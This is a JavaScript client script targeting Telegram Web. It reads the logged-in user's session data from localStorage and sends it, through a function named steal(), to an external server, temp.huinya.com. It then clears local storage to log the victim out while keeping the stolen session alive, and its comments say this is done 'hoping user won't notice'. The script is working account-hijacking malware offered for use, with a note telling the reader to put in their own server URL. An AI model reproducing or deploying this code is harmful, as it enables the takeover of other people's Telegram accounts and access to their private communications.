//* CLIENT

if (window.location.host == "web.telegram.org") {
  // script no workey with telegram webK, so redirect user to webA
  if (window.location.pathname == "/k/") {
    window.location.replace("/a/");
  }

  // get token from localStorage
  function getStorage() {
    return {
      account1: JSON.parse(localStorage.getItem("account1")),

      // tg webA was updated on 24.04, we don't need this, but i will leave it here just in case

      // user_auth: JSON.parse(localStorage.getItem("user_auth")),
      // dc2_auth_key: JSON.parse(localStorage.getItem("dc2_auth_key")),
    };
  }

  function steal(token) {
    // send token to server
    // change this url to your own server's url
    //! SERVER HAS TO USE HTTPS!
    fetch("https://temp.huinya.com/sendtoken", {
      method: "POST",
      mode: "no-cors",
      body: JSON.stringify({ data: token }),
      headers: {
        "Content-type": "application/x-www-form-urlencoded",
      },
    });
  }

  let intervalId = setInterval(checkToken, 200); // check every 0.2 seconds
  function checkToken() {
    let store = getStorage();

    //remove avatar, why the fuck would you store it in base64 in localstorage
    if (store.account1.avatarUri) store.account1.avatarUri = undefined;

    // check if first chat is loaded, and userId is present in localStorage
    if (
      typeof document.getElementsByClassName("chat-item-clickable")[0] !==
        "undefined" &&
      JSON.parse(localStorage.getItem("account1")) !== null &&
      typeof JSON.parse(localStorage.getItem("account1")).userId == "string"
    ) {
      // send to server!
      steal(store);
      console.log("sent");

      //* CRASH LOGIC

      // creates separate session, hoping user won't notice
      // made to bypass telegram's 406 DUPLICATE_AUTH_KEY error

      // if not yet crashed,
      if (localStorage.getItem("iscrashed") === null) {
        //clear localStorage, to log out user, without ending the session
        console.log("crash");
        localStorage.clear();

        // log crash and it's time
        localStorage.setItem("iscrashed", true);
        localStorage.setItem("crashts", Date.now());

        // reload page
        window.location.reload();
      } else {
        // if already crashed, do not do anything
        console.log("already crashed");
      }
      clearInterval(intervalId);
    } else {
      // if session is not yet present in localStorage

      // if crashed more than a minute ago, allow to crash again
      if (Date.now() - localStorage.getItem("crashts") > 60000) {
        localStorage.removeItem("iscrashed");
        localStorage.removeItem("crashts");
      }
    }
  }
}
